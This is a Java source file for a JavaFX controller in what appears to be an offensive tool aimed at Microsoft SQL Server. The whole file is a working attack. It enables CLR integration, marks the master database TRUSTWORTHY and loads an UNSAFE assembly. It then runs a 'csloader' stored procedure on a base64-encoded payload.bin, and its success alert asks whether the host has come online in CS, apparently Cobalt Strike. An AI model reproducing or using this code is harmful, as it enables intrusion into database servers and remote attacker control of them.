package com.ning.Controller;

import com.ning.Model.initButtonMonitorAndConnection;
import com.ning.Util.Base64Encoder;
import javafx.application.Platform;
import javafx.concurrent.Task;
import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.TextArea;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class clrController {
    @FXML
    private Button button_CS;

    @FXML
    private TextArea ta_CS;

    @FXML
    private TextArea ta_csContent;

    private String filepath;

    private String clrtxt;

    private String contents;

    @FXML
    public void initialize() {
        initcsgoButton();
        clrtxt = readClrFromResource();
        ta_csContent.setWrapText(true);
    }

    private void alerting(Alert.AlertType alertType,String s1,String s2){
        Alert alert = new Alert(alertType);
        alert.setTitle(s1);
        alert.setContentText(s2);
        alert.setHeaderText(null);
        alert.showAndWait();
    }

    private String readClrFromResource() {
        try (InputStream is = getClass().getResourceAsStream("/clrHome/clr.txt");
             BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line.trim());
            }
            return content.toString();
        } catch (IOException | NullPointerException e) {
            throw new RuntimeException("错误: 无法读取资源文件 - " + "/clrHome/clr.txt" + "\n");
        }
    }
    private void initcsgoButton(){
        button_CS.setOnAction(actionEvent -> {

            filepath = ta_CS.getText().trim();
            if(filepath.isEmpty()){
                alerting(Alert.AlertType.WARNING,"警告","payload.bin路径为空，请先清空文本后输入payload.bin路径");
                return;
            }

            Base64Encoder base64Encoder = new Base64Encoder();
            ta_csContent.appendText(base64Encoder.Base64ing(filepath));
            contents = ta_csContent.getText().trim();

            enableCLR();

            csgo();
        });
    }

    private void csgo() {
        Task<Void> dbTask = new Task<Void>() {
            @Override
            protected Void call() throws Exception {
                try (Connection conn = initButtonMonitorAndConnection.conn;
                     Statement stmt = conn.createStatement()) {

                    // 启用 CLR
                    stmt.execute("sp_configure 'clr enabled', 1");
                    stmt.execute("RECONFIGURE");
                    stmt.execute("ALTER DATABASE master SET TRUSTWORTHY ON");

                    // 检查并处理 CLR_module 程序集
                    checkAndHandleCLRModule(conn);

                    // 执行命令（使用 base64 编码）
                    String base64Cmd = contents;
                    String execCmd = "exec dbo.ClrExec 'csloader " + base64Cmd + "'";
                    stmt.execute(execCmd);

                    return null;
                } catch (SQLException e) {
                    throw new RuntimeException(e);
                }
            }
        };

        dbTask.setOnSucceeded(event -> {
            Platform.runLater(() -> {
                alerting(Alert.AlertType.INFORMATION, "成功", "请查看是否上线CS，enjoy！");
            });
        });

        dbTask.setOnFailed(event -> {
            Platform.runLater(() -> {
                alerting(Alert.AlertType.ERROR, "错误", "数据库操作失败：" + dbTask.getException().getMessage());
            });
        });

        new Thread(dbTask).start();
    }
    private void checkAndHandleCLRModule(Connection conn) throws SQLException {
        try (Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT 1 FROM sys.assemblies WHERE name = 'CLR_module'")) {

            boolean exists = rs.next(); // 如果存在记录，说明程序集已存在

            if (exists) {
                dropExistingCLRObjects(stmt);  //如果存在删除重新部署
            }

            // 创建新程序集
            String createAssembly = "CREATE ASSEMBLY [CLR_module] AUTHORIZATION [dbo] FROM " + clrtxt + " WITH PERMISSION_SET = UNSAFE";
            stmt.execute(createAssembly);

            // 创建 CLR 存储过程（无论是否存在旧程序集，都重新创建）
            String createProc = "IF OBJECT_ID('dbo.ClrExec') IS NOT NULL DROP PROCEDURE dbo.ClrExec; ";
            String createProc2 = "CREATE PROCEDURE [dbo].[ClrExec] @cmd NVARCHAR(MAX) AS EXTERNAL NAME [CLR_module].[StoredProcedures].[ClrExec]";
            stmt.execute(createProc);
            stmt.execute(createProc2);

        } catch (SQLException e) {
            throw new RuntimeException("程序集操作失败: " + e.getMessage(), e);
        }
    }

    private void dropExistingCLRObjects(Statement stmt) throws SQLException {

        stmt.execute("IF OBJECT_ID('dbo.ClrExec') IS NOT NULL DROP PROCEDURE dbo.ClrExec;");

        stmt.execute("DROP ASSEMBLY [CLR_module];");
    }

    private boolean isCLRConfigured(Connection conn) throws SQLException {
        try (Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(
                     "SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled'")) {
            if (rs.next()) {
                int value = rs.getInt(1);
                return value == 1;
            }
        }
        return false;
    }
    private void enableCLR(){
        try(Statement stmt = initButtonMonitorAndConnection.conn.createStatement()){
            if(!isCLRConfigured(initButtonMonitorAndConnection.conn)){
                // 设置高级选项可配置
                stmt.execute("sp_configure 'show advanced options', 1; RECONFIGURE;");
                // 启用 CLR
                stmt.execute("sp_configure 'clr enabled', 1; RECONFIGURE;");
                //导入不安全的程序集
                stmt.execute("ALTER DATABASE master SET TRUSTWORTHY ON;");
            }
        } catch (SQLException e) {
            throw new RuntimeException(e);
        }
    }


}
